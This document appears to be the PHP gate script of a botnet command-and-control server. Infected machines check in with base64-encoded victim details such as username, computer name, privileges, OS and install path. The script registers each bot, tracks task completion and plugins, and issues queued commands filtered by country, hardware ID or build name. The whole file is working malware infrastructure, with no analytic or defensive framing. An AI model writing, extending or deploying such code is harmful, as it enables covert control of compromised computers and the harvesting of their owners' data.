<?php
//error_reporting(E_ALL);
include_once 'inc/config.php';
include 'inc/geo.php';
include 'inc/rc4.php';
include 'inc/client.php';

function contains($needle, $haystack) {  return strpos($haystack, $needle) !== false; }

function xss_clean($data)
{
	$data = str_replace(array('&amp;','&lt;','&gt;'), array('&amp;amp;','&amp;lt;','&amp;gt;'), $data);
	$data = preg_replace('/(&#*\w+)[\x00-\x20]+;/u', '$1;', $data);
	$data = preg_replace('/(&#x*[0-9A-F]+);*/iu', '$1;', $data);
	$data = html_entity_decode($data, ENT_COMPAT, 'UTF-8');
	$data = preg_replace('#(<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>#iu', '$1>', $data);
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`\'"]*)[\x00-\x20]*j[\x00-\x20]*a[\x00-\x20]*v[\x00-\x20]*a[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2nojavascript...', $data);
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*v[\x00-\x20]*b[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#iu', '$1=$2novbscript...', $data);
	$data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*-moz-binding[\x00-\x20]*:#u', '$1=$2nomozbinding...', $data);
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?expression[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?behaviour[\x00-\x20]*\([^>]*+>#i', '$1>', $data);
	$data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:*[^>]*+>#iu', '$1>', $data);
	$data = preg_replace('#</*\w+:\w[^>]*+>#i', '', $data);
	do
	{
		$old_data = $data;
		$data = preg_replace('#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i', '', $data);
	}
	while ($old_data !== $data);
	return $data;
}

function generate_hwid($hwid)
{
	if (strlen($hwid) % 2 == 0) { return implode("-", str_split($hwid, 4)); }
	else {return implode("-", str_split($hwid, 3));}
}

$ip = $_SERVER['REMOTE_ADDR'];
$country = ip_info($ip, "Country Code");
if ($country == "" || $country == NULL){ $country = "US"; }
$hwid = generate_hwid(xss_clean(strtoupper(md5(base64_decode($_POST['id'])))));
if (isset($_POST['os'])) { $opsys =  xss_clean(base64_decode($_POST['os'])); } else { $opsys = "Unknown"; }
if (isset($_POST['pv'])) { $privs =  xss_clean(base64_decode($_POST['pv'])); } else { $privs = "Unknown"; }
if (isset($_POST['ip'])) { $inpat =  xss_clean(base64_decode($_POST['ip'])); } else { $inpat = "Unknown"; }
if (isset($_POST['cn'])) { $compn =  xss_clean(base64_decode($_POST['cn'])); } else { $compn = "Unknown"; }
if (isset($_POST['un'])) { $usernm = xss_clean(base64_decode($_POST['un'])); } else { $usernm = "Unknown"; }
if (isset($_POST['ca'])) { $cpuar = xss_clean(base64_decode($_POST['ca'])); } else { $cpuar = "Unknown"; }
if (isset($_POST['bv'])) { $botvr =  xss_clean(base64_decode($_POST['bv'])); } else { $botvr = "Unknown"; }
if (isset($_POST['bt'])) { $botyp =  xss_clean(base64_decode($_POST['bt'])); } else { $botyp = "Unknown"; } 
if (isset($_POST['bn'])) { $buildnm =  xss_clean(base64_decode($_POST['bn'])); } else { $buildnm = "Unknown"; }

$opera = "0";
$taskd = "0";
$unins = "0";
$sendPlugin = False;

if (isset($_POST['op'])){ $opera = xss_clean($_POST['op']); }
if (isset($_POST['td'])){ $taskd = xss_clean($_POST['td']); }
if (isset($_POST['uni'])){ $unins = xss_clean($_POST['uni']); }
if (isset($_POST['pl'])){ $sendPlugin = True; }
if (isset($_POST['pud']))
{
	try
	{	
		$pguid = xss_clean(base64_decode($_POST['pgd']));
		$pname = xss_clean(base64_decode($_POST['pnm']));
		$pdesc = xss_clean(base64_decode($_POST['pds']));
		$pvers = xss_clean(base64_decode($_POST['pve']));
		$pchk = $odb->prepare("SELECT COUNT(*) FROM plugins WHERE hwid = :h AND guid = :g");
		$pchk->execute(array(":h" => $hwid, ":g" => $pguid));
		if ($pchk->fetchColumn(0) == "0")
		{
			$padd = $odb->prepare("INSERT INTO plugins VALUES(NULL, :hwid, :g, :n, :d, :v)");
			$padd->execute(array(":hwid" => $hwid, ":g" => $pguid, ":n" => $pname, ":d" => $pdesc, ":v" => $pvers));
		}
		else
		{
			$padd = $odb->prepare("UPDATE plugins SET name = :n, desc = :d, vers = :v");
			$padd->execute(array(":n" => $pname, ":d" => $pdesc, ":v" => $pvers));
		}
	}
	catch (PDOException $e){ echo 'notask'; die(); }
	catch (Exception $e){ echo 'notask'; die(); }
}
try 
{
	$exs = $odb->prepare("SELECT COUNT(*) FROM bots WHERE hwid = :h");
	$exs->execute(array(":h" => $hwid));
	if ($exs->fetchColumn(0) == "0")
	{
		$i = $odb->prepare("INSERT INTO bots VALUES(NULL, :hw, :ip, :co, UNIX_TIMESTAMP(), UNIX_TIMESTAMP(), :td, :os, :ca, :cn, :un, :pv, :bt, :inn, :bv, '1', :bn)");
		$i->execute(array(":hw" => $hwid, ":ip" => $ip, ":co" => $country, ":td" => $taskd, ":os" => $opsys, ":ca" => $cpuar, ":cn" => $compn, ":un" => $usernm, ":pv" => $privs, "bt" => $botyp,":inn" => $inpat, ":bv" => $botvr, ":bn" => $buildnm));
	}
	else
	{
		$u = $odb->prepare("UPDATE bots SET lastresponce = UNIX_TIMESTAMP(), botversion = :bv, currenttask = :c, installpath = :os, privileges = :pv WHERE hwid = :h");
		$u->execute(array(":bv" => $botvr, ":c" => $taskd, ":os" => $inpat, ":pv" => $privs, ":h" => $hwid));
	}
} 
catch (PDOException $e){ echo 'notask'; die(); }
catch (Exception $e){ echo 'notask'; die(); }

$client = new client($hwid);

if ($opera == "1")
{
	$in = $odb->prepare("INSERT INTO tasks_completed VALUES(NULL, :h, :i)");
	$in->execute(array(":h" => $hwid, ":i" => $taskd));
}
if ($opera == "2")
{
	$error =$_POST['ec'];
	$in = $odb->prepare("INSERT INTO tasks_failed VALUES(NULL, :h, :i, :c)");
	$in->execute(array(":h" => $hwid, ":i" => $taskd, ":c" => $error));
}
if ($unins == "1")
{
	$del = $odb->prepare("DELETE FROM bots WHERE hwid = :h LIMIT 1");
	$pdel = $odb->prepare("DELETE FROM plugins WHERE hwid = :h");
	$del->execute(array(":h" => $hwid));
	$pdel->execute(array(":h" => $hwid));
}
$cmds = $odb->query("SELECT * FROM tasks ORDER BY id");
$isTask = false;

if($sendPlugin)
{
	$loc = $_SERVER['REQUEST_URI'];
	if (contains(".php", $loc)) { $loc = substr($loc, 0, -4); }
	$loca = explode("/", $loc);
	array_pop($loca); array_push($loca, "plugins");
	$loc = implode("/", $loca); $loc = $loc . "/";
	$parr = array_slice(scandir("./" . "plugins" . "/"), 2);
	foreach ($parr as &$value) { $value = $loc . $value; } 
	$final = implode("`", $parr);
	$final = $final . "`";
	echo $final;
	die();
}
else
{
	while ($com = $cmds->fetch(PDO::FETCH_ASSOC))
	{
		if ($com['status'] == "1" && $client->info['mark'] == "1")
		{
			$executions = $odb->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
			if ($executions == $com['executions']) { continue; }
			else
			{
				$ad = $odb->prepare("SELECT COUNT(*) FROM tasks_failed WHERE taskid = :i AND bothwid = :h");
				$ae = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
				$ae->execute(array(":i" => $com['id'], ":h" => $hwid));$ad->execute(array(":i" => $com['id'], ":h" => $hwid));
				if ($ad->fetchColumn(0) == 1) { continue; }
				if ($ae->fetchColumn(0) == 0)
				{
					if($com["filters"] == "None")
					{
						$isTask = true;
						echo 'newtask`'.$com['id'].'`'.$com['task'].'`'.$com['params'];
						die();
					}
					else
					{
						$filters = array_map('trim', explode(',', $com["filters"]));
						if($com["fbc"] == 1 && in_array($client->info['country'], $filters))
						{
							$isTask = true;
							echo 'newtask`'.$com['id'].'`'.$com['task'].'`'.$com['params'];
							die();
						}
						if($com["fbi"] == 1 && in_array($client->info['hwid'], $filters))
						{
							$isTask = true;
							echo 'newtask`'.$com['id'].'`'.$com['task'].'`'.$com['params'];
							die();
						}
						if($com["fbb"] == 1 && in_array($client->info['build_name'], $filters))
						{
							$isTask = true;
							echo 'newtask`'.$com['id'].'`'.$com['task'].'`'.$com['params'];
							die();
						}
					}
				}
			}
		}
	}

	if(!$isTask){ echo 'notask'; }
}
?>